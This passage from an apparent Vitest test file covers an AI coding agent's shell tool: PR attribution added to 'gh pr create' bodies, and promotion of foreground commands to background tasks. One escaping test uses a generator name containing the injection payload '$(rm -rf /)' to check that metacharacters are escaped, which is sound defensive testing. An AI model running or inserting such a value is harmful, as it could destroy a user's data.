        expect(cmd).not.toMatch(
          /--body "ignored[\s\S]*Generated with Qwen Code[\s\S]*" --body/,
        );
      });

      // `gh --repo owner/repo pr create` shifts pr/create past the
      // fixed `tokens[1]/tokens[2]` slots; a literal-position check
      // misses these forms.
      it('should append attribution when gh has global flags before pr create', async () => {
        const command =
          'gh --repo owner/repo pr create --title "x" --body "Summary"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Generated with Qwen Code'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // The `--body=value` (equals-sign) form is common with gh; the
      // earlier `\s+` separator only matched `--body value`.
      it('should append attribution to --body="..." equals-sign form', async () => {
        const command = 'gh pr create --title "x" --body="Summary"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.stringContaining('Generated with Qwen Code'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // Quoted "gh pr create" should not look like an executed PR command.
      it('should NOT rewrite when gh pr create appears only inside quoted text', async () => {
        const command = 'echo "gh pr create --title x --body \\"Summary\\""';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.not.stringContaining('Generated with Qwen Code'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      it('should skip PR attribution when pr is off even if commit is on', async () => {
        // Commit and PR toggles must be independent.
        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
          commit: true,
          pr: false,
          name: 'Qwen-Coder',
          email: 'qwen-coder@alibabacloud.com',
        });

        const command = 'gh pr create --title "x" --body "Summary"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        expect(mockShellExecutionService).toHaveBeenCalledWith(
          expect.not.stringContaining('Generated with Qwen Code'),
          expect.any(String),
          expect.any(Function),
          expect.any(AbortSignal),
          false,
          expect.objectContaining({}),

          expect.objectContaining({ postPromote: expect.any(Object) }),
        );
      });

      // Without escaping, a generator name containing `"`, `$`, or a
      // backtick would either break the user-approved `gh pr create`
      // command or be evaluated as command substitution. The fix was to
      // shell-escape the appended text for the surrounding quote style.
      it('should escape generator names with shell metacharacters in double-quoted body', async () => {
        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
          commit: true,
          pr: true,
          // A name designed to break double-quote interpolation if not escaped.
          name: 'Bot $(rm -rf /) "danger" `eval`',
          email: 'bot@example.com',
        });
        // Generator name only ends up in the attribution when shots > 0.
        const svc = CommitAttributionService.getInstance();
        svc.incrementPromptCount();

        const command = 'gh pr create --title "x" --body "Summary"';
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        const observedCmd = mockShellExecutionService.mock.calls[0][0];
        // Each metacharacter must be escaped, not literal.
        expect(observedCmd).toContain('\\$');
        expect(observedCmd).toContain('\\"');
        expect(observedCmd).toContain('\\`');
        // And the original `--body` quote must still close properly
        // (`s` flag — body contains newlines from the attribution).
        expect(observedCmd).toMatch(/--body\s+".+"/s);
      });

      it('should escape single-quoted body containing apostrophes in generator name', async () => {
        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
          commit: true,
          pr: true,
          name: "O'Brien-Bot",
          email: 'bot@example.com',
        });
        const svc = CommitAttributionService.getInstance();
        svc.incrementPromptCount();

        const command = "gh pr create --title 'x' --body 'Summary'";
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        const observedCmd = mockShellExecutionService.mock.calls[0][0];
        // The bash close-escape-reopen trick yields `'\''` in place of `'`.
        expect(observedCmd).toContain("O'\\''Brien-Bot");
      });

      // A body that already uses bash's `'\''` apostrophe-escape form
      // should be matched as a single complete argument so the trailer
      // appends after the full body, not after the first quote-segment.
      it("should match the full body across '\\\\'' apostrophe escapes", async () => {
        const command = "gh pr create --title 'x' --body 'don'\\''t break me'";
        const invocation = shellTool.build({ command, is_background: false });
        const promise = invocation.execute(mockAbortSignal);

        resolveExecutionPromise({
          rawOutput: Buffer.from(''),
          output: '',
          exitCode: 0,
          signal: null,
          error: null,
          aborted: false,
          pid: 12345,
          executionMethod: 'child_process',
        });

        await promise;

        const observed = mockShellExecutionService.mock.calls[0][0];
        // The original body content is preserved end-to-end.
        expect(observed).toContain("don'\\''t break me");
        // The attribution lands AFTER the original body, not in the
        // middle of it.
        expect(observed).toMatch(
          /don'\\''t break me[\s\S]*Generated with Qwen Code/,
        );
      });
    });

    describe('foreground → background promote (#3831 PR-2)', () => {
      it("exposes a promote AbortController whose signal is wired into ShellExecutionService.execute's combined signal", async () => {
        // Pin the operational guarantee: aborting the controller exposed
        // via `setPromoteAbortControllerCallback` must actually reach
        // `ShellExecutionService` — the bare "controller is an
        // AbortController instance" assertion would still pass if
        // `shell.ts` exposed the controller but forgot to include
        // `promoteAbortController.signal` in `AbortSignal.any(...)`,
        // silently breaking the future Ctrl+B keybind.
        const setPromoteAc = vi.fn();
        const invocation = shellTool.build({
          command: 'npm run dev',
          is_background: false,
        });
        // Cast to the concrete invocation type to access the extra
        // ShellTool-specific execute() params (setPidCallback +
        // setPromoteAbortControllerCallback) — the base ToolInvocation
        // type only has the 3-param signature shared across all tools.
        const promise = (invocation as ShellToolInvocation).execute(
          mockAbortSignal,
          undefined,
          {},
          undefined,
          setPromoteAc,
        );
        resolveShellExecution({ pid: 12345 });
        await promise;

        expect(setPromoteAc).toHaveBeenCalledTimes(1);
        const passedAc = setPromoteAc.mock.calls[0][0] as AbortController;
        expect(passedAc).toBeInstanceOf(AbortController);

        // Capture the AbortSignal handed to ShellExecutionService.execute
        // (4th arg per the call signature) and verify firing the promote
        // controller propagates through it.
        const passedSignal = mockShellExecutionService.mock
          .calls[0][3] as AbortSignal;
        expect(passedSignal.aborted).toBe(false);
        passedAc.abort({ kind: 'background', shellId: 'bg_unit_test' });
        expect(passedSignal.aborted).toBe(true);
      });

      it('registers a bg_xxx entry on `result.promoted: true` and returns promote-flavored ToolResult', async () => {
        const writeFileSyncSpy = vi.mocked(fs.writeFileSync);
        writeFileSyncSpy.mockReturnValue(undefined);
        const registry = mockConfig.getBackgroundShellRegistry();
        const invocation = shellTool.build({
          command: 'tail -f /tmp/never.log',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        // Service signals promote: snapshot ready, child still alive.
        resolveShellExecution({
          output: 'partial output before promote',
          exitCode: null,
          signal: null,
          aborted: false, // ← per #3831 design question 7
          promoted: true,
          pid: 99999,
        });
        const result = await promise;

        // Entry registered with the spawn pid + promote AbortController.
        expect(registry.register).toHaveBeenCalledTimes(1);
        const entry = (registry.register as Mock).mock.calls[0][0];
        expect(entry.command).toBe('tail -f /tmp/never.log');
        expect(entry.cwd).toBe('/test/dir');
        expect(entry.status).toBe('running');
        expect(entry.pid).toBe(99999);
        expect(entry.shellId).toMatch(/^bg_/);
        expect(entry.outputPath).toContain(entry.shellId);
        expect(entry.abortController).toBeInstanceOf(AbortController);

        // Snapshot written to the output stream (PR-2.5: snapshot +
        // post-promote bytes now share a single append-mode stream
        // instead of the prior writeFileSync snapshot-only path).
        expect(fs.createWriteStream).toHaveBeenCalledWith(entry.outputPath, {
          flags: 'w',
        });
        const streamMock = (fs.createWriteStream as Mock).mock.results[0]
          ?.value as { write: Mock };
        expect(streamMock.write).toHaveBeenCalledWith(
          'partial output before promote',
        );

        // Model-facing copy points at /tasks / dialog / task_stop.
        expect(result.llmContent).toContain(
          `promoted to background as ${entry.shellId}`,
        );
        expect(result.llmContent).toContain(`PID: 99999`);
        expect(result.llmContent).toContain('/tasks');
        expect(result.llmContent).toContain(
          `task_stop({ task_id: '${entry.shellId}'`,
        );
        expect(result.returnDisplay).toContain(
          `Promoted to background: ${entry.shellId}`,
        );
        // No `error` on the result — promote is a success-shaped outcome
        // per #3831 design question 7 / @tanzhenxin's PR-1 review.
        expect(result.error).toBeUndefined();
      });

      it('aborting entry.abortController kills the child via SIGTERM/SIGKILL and marks the registry entry cancelled', async () => {
        // Pin the core operational guarantee for promoted shells:
        // `task_stop bg_xxx` (which goes through
        // `registry.requestCancel` → `entry.abortController.abort()`)
        // must actually stop the child + transition the entry to
        // `'cancelled'`. The bare "fresh controller" check below
        // doesn't exercise the full kill path.
        vi.useFakeTimers();
        const processKillSpy = vi
          .spyOn(process, 'kill')
          .mockImplementation(() => true);
        try {
          const writeFileSyncSpy = vi.mocked(fs.writeFileSync);
          writeFileSyncSpy.mockReturnValue(undefined);
          const registry = mockConfig.getBackgroundShellRegistry();
          const invocation = shellTool.build({
            command: 'tail -f /tmp/never.log',
            is_background: false,
          });
          const promise = invocation.execute(mockAbortSignal);
          resolveShellExecution({
            output: '',
            exitCode: null,
            signal: null,
            aborted: false,
            promoted: true,
            pid: 55555,
          });
          await promise;

          const entry = (registry.register as Mock).mock.calls[0][0];
          // Trigger the cancellation path the way `task_stop` does.
          entry.abortController.abort();
          // Sync part of cancelChild runs as a microtask after abort:
          // SIGTERM is dispatched, then the listener awaits a 200ms
          // timer before SIGKILL + registry.cancel. Flush microtasks +
          // advance fake time past the SIGKILL window.
          await Promise.resolve();
          expect(processKillSpy).toHaveBeenCalledWith(-55555, 'SIGTERM');
          // Advance past PROMOTE_CANCEL_SIGKILL_TIMEOUT_MS (200ms).
          await vi.advanceTimersByTimeAsync(250);
          expect(processKillSpy).toHaveBeenCalledWith(-55555, 'SIGKILL');
          // Registry entry transitions to 'cancelled' synchronously
          // after SIGKILL — so /tasks reflects user intent without
          // waiting for the (non-existent) settle path.
          expect(registry.cancel).toHaveBeenCalledWith(
            entry.shellId,
            expect.any(Number),
          );
        } finally {
          processKillSpy.mockRestore();
          vi.useRealTimers();
        }
      });

      it("entry.abortController is a FRESH controller (not the already-aborted promote controller) so task_stop's abort() actually fires kill listeners", async () => {
        // Real-bug regression: if `entry.abortController` were the
        // same `promoteAbortController` that triggered the promote,
        // it would already be in the `aborted: true` state by the time
        // it landed in the registry. `task_stop bg_xxx` calls
        // `entry.abortController.abort()` which is a no-op on an
        // already-aborted controller, AND `ShellExecutionService` has
        // detached its abort listener as part of the promote handoff,
        // so the still-running child would survive task_stop forever.
        // Pin: entry.abortController.signal.aborted === false at
        // registration.
        const writeFileSyncSpy = vi.mocked(fs.writeFileSync);
        writeFileSyncSpy.mockReturnValue(undefined);
        const registry = mockConfig.getBackgroundShellRegistry();
        const invocation = shellTool.build({
          command: 'tail -f /tmp/never.log',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        resolveShellExecution({
          output: '',
          exitCode: null,
          signal: null,
          aborted: false,
          promoted: true,
          pid: 77777,
        });
        await promise;

        const entry = (registry.register as Mock).mock.calls[0][0];
        expect(entry.abortController.signal.aborted).toBe(false);
      });

      it('survives a snapshot write failure — registry entry still registered', async () => {
        const writeFileSyncSpy = vi.mocked(fs.writeFileSync);
        writeFileSyncSpy.mockImplementation(() => {
          throw new Error('ENOSPC: no space left on device');
        });
        const registry = mockConfig.getBackgroundShellRegistry();
        const invocation = shellTool.build({
          command: 'tail -f /tmp/never.log',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        resolveShellExecution({
          output: 'pre-promote',
          exitCode: null,
          signal: null,
          aborted: false,
          promoted: true,
          pid: 88888,
        });
        const result = await promise;

        // The disk write failure is logged + swallowed: the entry is
        // still valuable on its own; the file is the inspection
        // surface, not the source of truth.
        expect(registry.register).toHaveBeenCalledTimes(1);
        expect(result.llmContent).toContain('promoted to background');
      });

      it('entry.command holds the post-co-author-rewrite form (commandToExecute), not raw params.command', async () => {
        // #3894 review: previously `entry.command` used
        // `this.params.command`, which diverges from what actually ran
        // for `git commit -m` invocations that
        // `addCoAuthorToGitCommit()` rewrote into a multi-line form
        // with `-m "Co-Authored-By: …"`. Pin: registered entry MUST
        // mirror the post-rewrite command so /tasks shows what the OS
        // actually executed.
        const writeFileSyncSpy = vi.mocked(fs.writeFileSync);
        writeFileSyncSpy.mockReturnValue(undefined);
        const registry = mockConfig.getBackgroundShellRegistry();
        const rawCommand = 'git commit -m "feat: ship promote"';
        const invocation = shellTool.build({
          command: rawCommand,
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        resolveShellExecution({
          output: '',
          exitCode: null,
          signal: null,
          aborted: false,
          promoted: true,
          pid: 33333,
        });
        const result = await promise;

        // The actual command passed to ShellExecutionService.execute is
        // the post-rewrite form — capture it from the service mock.
        const commandPassedToService = mockShellExecutionService.mock
          .calls[0][0] as string;
        expect(commandPassedToService).not.toBe(rawCommand); // sanity: rewrite happened
        expect(commandPassedToService).toContain('Co-authored-by');

        const entry = (registry.register as Mock).mock.calls[0][0];
        expect(entry.command).toBe(commandPassedToService);
        expect(entry.command).not.toBe(rawCommand);

        // llmContent also references the post-rewrite form so the
        // model sees consistent state.
        expect(result.llmContent).toContain(commandPassedToService);
      });

      it('rethrows + kills child when mkdirSync(outputDir) throws — no orphan zombie', async () => {
        // @tanzhenxin's review on #3894: mkdirSync ran before any
        // try/catch, so an unwritable output dir (read-only mount,
        // sandbox perms, ENOSPC on metadata) rejected the handler
        // BEFORE the registry's kill listener was wired — the still-
        // running child became an orphan with no kill path until the
        // OS reaped it on session end. Pin the regression: mkdir-throw
        // is re-raised AND the child gets SIGTERM right away.
        const processKillSpy = vi
          .spyOn(process, 'kill')
          .mockImplementation(() => true);
        const mkdirSyncSpy = vi.mocked(fs.mkdirSync);
        try {
          mkdirSyncSpy.mockImplementation(() => {
            throw new Error('EROFS: read-only file system');
          });
          const invocation = shellTool.build({
            command: 'tail -f /tmp/never.log',
            is_background: false,
          });
          const promise = invocation.execute(mockAbortSignal);
          resolveShellExecution({
            output: '',
            exitCode: null,
            signal: null,
            aborted: false,
            promoted: true,
            pid: 22222,
          });

          await expect(promise).rejects.toThrow('EROFS');
          // SIGTERM is sync after the throw — no fake timers needed.
          expect(processKillSpy).toHaveBeenCalledWith(-22222, 'SIGTERM');
        } finally {
          mkdirSyncSpy.mockReturnValue(undefined);
          processKillSpy.mockRestore();
        }
      });

      it('promote-refused race (aborted: true, promoted: false after promote signal) is reported as benign race, not "Command timed out"', async () => {
        // @tanzhenxin's review on #3894: when PR-3's Ctrl+B keybind
        // fires `promoteAbortController.abort` but the service's race
        // guard refuses promotion (the child terminated a beat
        // earlier), the result lands `aborted: true, promoted: false`.
        // Without excluding the promote signal from the timeout
        // discriminator, the foreground path falsely reports
        // "Command timed out" for a process that finished naturally.
        const setPromoteAc = vi.fn();
        const invocation = shellTool.build({
          command: 'sleep 1',
          is_background: false,
        });
        const promise = (invocation as ShellToolInvocation).execute(
          mockAbortSignal,
          undefined,
          {},
          undefined,
          setPromoteAc,
        );
        // Capture the promote AC the foreground path exposes.
        await Promise.resolve();
        const promoteAc = setPromoteAc.mock.calls[0]?.[0] as
          | AbortController
          | undefined;
        expect(promoteAc).toBeInstanceOf(AbortController);
        // Fire promote AFTER the child supposedly terminated — the
        // service refuses with `aborted: true, promoted: false`.
        promoteAc!.abort({ kind: 'background', shellId: 'bg_late' });
        resolveShellExecution({
          output: 'oops too late\n',
          exitCode: null,
          signal: null,
          aborted: true,
          promoted: false,
          pid: 33333,
        });
        const result = await promise;

        // Must NOT say "timed out" — the child finished naturally.
        expect(String(result.llmContent)).not.toContain('timed out');
        // Should explain the benign race so the agent doesn't retry as
        // a cancellation/timeout.
        expect(String(result.llmContent)).toContain(
          'Command finished before the background-promote',
        );
        // Captured output is preserved.
        expect(String(result.llmContent)).toContain('oops too late');
      });

      it('rethrows + kills child when registry.register throws — no orphan zombie', async () => {
        // #3894 review: today `BackgroundShellRegistry.register` is
        // internally safe (Map.set + emit) but if a future
        // implementation throws, the promoted child is already
        // detached from the service's listeners and would become an
        // orphan zombie with no kill path. Pin: register-throw is
        // re-raised AND the child gets SIGTERM (best-effort kill via
        // the entry's abort listener).
        vi.useFakeTimers();
        const processKillSpy = vi
          .spyOn(process, 'kill')
          .mockImplementation(() => true);
        try {
          const writeFileSyncSpy = vi.mocked(fs.writeFileSync);
          writeFileSyncSpy.mockReturnValue(undefined);
          const registry = mockConfig.getBackgroundShellRegistry();
          (registry.register as Mock).mockImplementation(() => {
            throw new Error('boom: registry borked');
          });
          const invocation = shellTool.build({
            command: 'tail -f /tmp/never.log',
            is_background: false,
          });
          const promise = invocation.execute(mockAbortSignal);
          resolveShellExecution({
            output: '',
            exitCode: null,
            signal: null,
            aborted: false,
            promoted: true,
            pid: 44444,
          });

          // Re-thrown to caller (scheduler will surface as tool error).
          await expect(promise).rejects.toThrow('boom: registry borked');

          // The catch path fired entryAc.abort() → cancelChild → SIGTERM.
          await Promise.resolve();
          expect(processKillSpy).toHaveBeenCalledWith(-44444, 'SIGTERM');
          // SIGKILL fires after the 200ms timer; advance + assert.
          await vi.advanceTimersByTimeAsync(250);
          expect(processKillSpy).toHaveBeenCalledWith(-44444, 'SIGKILL');
        } finally {
          processKillSpy.mockRestore();
          vi.useRealTimers();
        }
      });
    });

    describe('foreground → background promote PR-2.5 (post-promote stream + natural-exit settle)', () => {
      it('post-promote bytes APPEND to bg_xxx.output via write stream (do NOT overwrite snapshot)', async () => {
        // Pin the PR-2.5 stream-redirect contract: snapshot lands
        // first, post-promote chunks flow through `stream.write` in
        // FIFO order. Without this PR the file was frozen at promote
        // time and live updates never reached /tasks.
        const writeStreamMock = {
          write: vi.fn(),
          end: vi.fn(),
          on: vi.fn(),
          // PR-2.5: settle path uses `once('finish', ...)` to wait
          // for the stream flush before transitioning the registry.
          // Default impl: immediately invoke the handler so the test
          // doesn't hang waiting for an event the mocked stream
          // never emits naturally.
          once: vi.fn((event: string, handler: () => void) => {
            if (event === 'finish') handler();
          }),
        };
        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
          writeStreamMock as unknown as fs.WriteStream,
        );
        const registry = mockConfig.getBackgroundShellRegistry();
        const invocation = shellTool.build({
          command: 'tail -f /tmp/never.log',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        // Service resolves promoted with snapshot.
        resolveShellExecution({
          output: 'initial-snapshot',
          exitCode: null,
          signal: null,
          aborted: false,
          promoted: true,
          pid: 11111,
        });
        await promise;

        const entry = (registry.register as Mock).mock.calls[0][0];
        // Stream opened in overwrite mode at promote time so a stale
        // file under the same shellId (vanishingly unlikely given
        // randomBytes) starts fresh.
        expect(fs.createWriteStream).toHaveBeenCalledWith(entry.outputPath, {
          flags: 'w',
        });
        // Snapshot written first.
        expect(writeStreamMock.write).toHaveBeenNthCalledWith(
          1,
          'initial-snapshot',
        );
      });

      it('natural child exit transitions the registry entry to "completed" (exitCode 0)', async () => {
        // Pin the PR-2.5 settle path: after promote, when the
        // service's post-promote exit listener fires with exitCode=0,
        // `registry.complete(shellId, 0, ...)` is called and the
        // stream closes.
        const writeStreamMock = {
          write: vi.fn(),
          end: vi.fn(),
          on: vi.fn(),
          // PR-2.5: settle path uses `once('finish', ...)` to wait
          // for the stream flush before transitioning the registry.
          // Default impl: immediately invoke the handler so the test
          // doesn't hang waiting for an event the mocked stream
          // never emits naturally.
          once: vi.fn((event: string, handler: () => void) => {
            if (event === 'finish') handler();
          }),
        };
        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
          writeStreamMock as unknown as fs.WriteStream,
        );
        const registry = mockConfig.getBackgroundShellRegistry();
        // Capture the postPromote options passed to the service so
        // we can drive its onSettle handler directly (the mocked
        // service doesn't fire it on its own).
        const invocation = shellTool.build({
          command: 'sleep 1',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        resolveShellExecution({
          output: '',
          exitCode: null,
          signal: null,
          aborted: false,
          promoted: true,
          pid: 22222,
        });
        await promise;

        // Pull the postPromote options from the service mock's last
        // call (foreground execute always passes it post-PR-2.5).
        const serviceCall = mockShellExecutionService.mock.calls[0];
        const opts = serviceCall[6] as {
          postPromote?: {
            onSettle?: (info: {
              exitCode: number | null;
              signal: number | null;
              error?: Error;
              endTime: number;
            }) => void;
          };
        };
        expect(opts?.postPromote?.onSettle).toBeDefined();
        opts.postPromote!.onSettle!({
          exitCode: 0,
          signal: null,
          endTime: 1700000000000,
        });

        const entry = (registry.register as Mock).mock.calls[0][0];
        expect(registry.complete).toHaveBeenCalledWith(
          entry.shellId,
          0,
          1700000000000,
        );
        // Stream closed on settle.
        expect(writeStreamMock.end).toHaveBeenCalled();
      });

      it('non-zero exit / signal / error all transition entry to "failed" with descriptive message', async () => {
        // Pin the failure-mode decision table.
        const registry = mockConfig.getBackgroundShellRegistry();
        const invocation = shellTool.build({
          command: 'cmd',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        resolveShellExecution({
          output: '',
          exitCode: null,
          signal: null,
          aborted: false,
          promoted: true,
          pid: 33333,
        });
        await promise;
        const serviceCall = mockShellExecutionService.mock.calls[0];
        const onSettle = (
          serviceCall[6] as {
            postPromote: {
              onSettle: (info: {
                exitCode: number | null;
                signal: number | null;
                error?: Error;
                endTime: number;
              }) => void;
            };
          }
        ).postPromote.onSettle;
        const entry = (registry.register as Mock).mock.calls[0][0];

        // Non-zero exitCode → fail with "Exited with code N".
        onSettle({ exitCode: 137, signal: null, endTime: 1 });
        expect(registry.fail).toHaveBeenCalledWith(
          entry.shellId,
          'Exited with code 137',
          1,
        );

        // signal-killed (no exitCode) → fail with "Terminated by signal N".
        onSettle({ exitCode: null, signal: 15, endTime: 2 });
        expect(registry.fail).toHaveBeenCalledWith(
          entry.shellId,
          'Terminated by signal 15',
          2,
        );

        // Spawn-side error → fail with err.message.
        onSettle({
          exitCode: null,
          signal: null,
          error: new Error('ENOENT'),
          endTime: 3,
        });
        expect(registry.fail).toHaveBeenCalledWith(entry.shellId, 'ENOENT', 3);
      });

      it('queued-settle race: onSettle fires BEFORE handlePromotedForeground completes — entry settles + llmContent reflects final status', async () => {
        // Pin the queued-settle path: a very fast command can exit
        // between the service-side promote-resolve and the
        // shell.ts-side handlePromotedForeground completing the
        // registry register + onSettleWired install. PR-2.5 absorbs
        // that race by queueing settle info into
        // `promoteArtifacts.settleQueued`; handlePromotedForeground
        // drains it synchronously after wiring. Without that drain
        // the entry would stay 'running' forever (no further onSettle
        // ever fires — the service only emits once per promote).
        const writeStreamMock = {
          write: vi.fn(),
          end: vi.fn(),
          on: vi.fn(),
          once: vi.fn((event: string, handler: () => void) => {
            if (event === 'finish') handler();
          }),
        };
        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
          writeStreamMock as unknown as fs.WriteStream,
        );
        const registry = mockConfig.getBackgroundShellRegistry();

        // Custom one-shot service impl that captures postPromote and
        // FIRES onSettle BEFORE resolving the promise — simulates the
        // fast-exit race window.
        let capturedPostPromote:
          | {
              onSettle?: (info: {
                exitCode: number | null;
                signal: number | null;
                error?: Error;
                endTime: number;
              }) => void;
            }
          | undefined;
        mockShellExecutionService.mockImplementationOnce(
          (...args: unknown[]) => {
            const opts = args[6] as {
              postPromote?: typeof capturedPostPromote;
            };
            capturedPostPromote = opts?.postPromote;
            // Fire onSettle SYNCHRONOUSLY before resolving (the race
            // we're testing — settle lands while handlePromotedForeground
            // hasn't run yet).
            capturedPostPromote?.onSettle?.({
              exitCode: 0,
              signal: null,
              endTime: 1700000000123,
            });
            return {
              pid: 77777,
              result: Promise.resolve({
                rawOutput: Buffer.from(''),
                output: 'final output',
                exitCode: null,
                signal: null,
                aborted: false,
                promoted: true,
                pid: 77777,
                executionMethod: 'child_process',
                error: null,
              }),
            };
          },
        );

        const invocation = shellTool.build({
          command: 'echo hi',
          is_background: false,
        });
        const result = await invocation.execute(mockAbortSignal);
        const entry = (registry.register as Mock).mock.calls[0][0];

        // Registry transitioned to completed via the queued-settle drain.
        expect(registry.complete).toHaveBeenCalledWith(
          entry.shellId,
          0,
          1700000000123,
        );

        // Model-facing copy now says 'completed', not 'running', AND
        // does NOT suggest task_stop (process is already gone).
        expect(result.llmContent).toContain('Status: completed.');
        expect(result.llmContent).not.toContain('Status: running.');
        expect(result.llmContent).toContain('already exited');
        expect(result.llmContent).not.toContain('task_stop({');
      });

      it('queued-settle race with non-zero exit code: llmContent reflects failed status', async () => {
        const writeStreamMock = {
          write: vi.fn(),
          end: vi.fn(),
          on: vi.fn(),
          once: vi.fn((event: string, handler: () => void) => {
            if (event === 'finish') handler();
          }),
        };
        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
          writeStreamMock as unknown as fs.WriteStream,
        );
        const registry = mockConfig.getBackgroundShellRegistry();

        let capturedPostPromote:
          | {
              onSettle?: (info: {
                exitCode: number | null;
                signal: number | null;
                error?: Error;
                endTime: number;
              }) => void;
            }
          | undefined;
        mockShellExecutionService.mockImplementationOnce(
          (...args: unknown[]) => {
            const opts = args[6] as {
              postPromote?: typeof capturedPostPromote;
            };
            capturedPostPromote = opts?.postPromote;
            capturedPostPromote?.onSettle?.({
              exitCode: 1,
              signal: null,
              endTime: 1700000000456,
            });
            return {
              pid: 88888,
              result: Promise.resolve({
                rawOutput: Buffer.from(''),
                output: 'error output',
                exitCode: null,
                signal: null,
                aborted: false,
                promoted: true,
                pid: 88888,
                executionMethod: 'child_process',
                error: null,
              }),
            };
          },
        );

        const invocation = shellTool.build({
          command: 'exit 1',
          is_background: false,
        });
        const result = await invocation.execute(mockAbortSignal);
        const entry = (registry.register as Mock).mock.calls[0][0];

        expect(registry.fail).toHaveBeenCalledWith(
          entry.shellId,
          'Exited with code 1',
          1700000000456,
        );
        expect(result.llmContent).toContain('Status: failed.');
        expect(result.llmContent).not.toContain('Status: running.');
        expect(result.llmContent).toContain('already exited');
        expect(result.llmContent).not.toContain('task_stop({');
      });

      it("wave-2 (C3): llmContent reflects 'completed' even when stream.once('finish') fires asynchronously after the queued-settle drain", async () => {
        // Regression for the C3 race: previously the model-facing
        // status flag was only flipped INSIDE `transitionRegistry`,
        // which `onSettleWired` defers until the output stream's
        // `'finish'` event fires (libuv flush). For a fast-exited
        // command whose settle arrives BEFORE handlePromotedForeground
        // wires onSettleWired (queued-settle path), the drain happens
        // synchronously but the actual registry transition is
        // microtask-deferred. The old code built `llmContent` before
        // the flag flipped → "Status: running" + `task_stop`
        // instructions leaked into the model copy even though the
        // child was already gone.
        //
        // Fix splits the flag into two: `postPromoteSettleObserved`
        // (sync, set on classify) drives the model copy;
        // `transitionRegistry` (async, behind finish) handles the
        // registry side. This test captures the finish handler
        // INSTEAD of firing it immediately, so the registry transition
        // is genuinely deferred while we read `result.llmContent`.
        let capturedFinishHandler: (() => void) | null = null;
        const writeStreamMock = {
          write: vi.fn(),
          end: vi.fn(),
          on: vi.fn(),
          once: vi.fn((event: string, handler: () => void) => {
            if (event === 'finish') capturedFinishHandler = handler;
          }),
        };
        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
          writeStreamMock as unknown as fs.WriteStream,
        );
        const registry = mockConfig.getBackgroundShellRegistry();

        let capturedPostPromote:
          | {
              onSettle?: (info: {
                exitCode: number | null;
                signal: number | null;
                error?: Error;
                endTime: number;
              }) => void;
            }
          | undefined;
        mockShellExecutionService.mockImplementationOnce(
          (...args: unknown[]) => {
            const opts = args[6] as {
              postPromote?: typeof capturedPostPromote;
            };
            capturedPostPromote = opts?.postPromote;
            // Fast-exit race: fire onSettle BEFORE resolve so
            // settleQueued path is exercised.
            capturedPostPromote?.onSettle?.({
              exitCode: 0,
              signal: null,
              endTime: 1700000000999,
            });
            return {
              pid: 88888,
              result: Promise.resolve({
                rawOutput: Buffer.from(''),
                output: 'fast output',
                exitCode: null,
                signal: null,
                aborted: false,
                promoted: true,
                pid: 88888,
                executionMethod: 'child_process',
                error: null,
              }),
            };
          },
        );

        const invocation = shellTool.build({
          command: 'true',
          is_background: false,
        });
        const result = await invocation.execute(mockAbortSignal);
        const entry = (registry.register as Mock).mock.calls[0][0];

        // Stream's 'finish' handler captured but NOT yet invoked, so
        // the registry transition is genuinely deferred at this point.
        expect(capturedFinishHandler).not.toBeNull();
        expect(registry.complete).not.toHaveBeenCalled();

        // Model-facing copy still reports the correct terminal status
        // because `postPromoteSettleObserved` was flipped sync inside
        // onSettleWired BEFORE the stream-finish wait began.
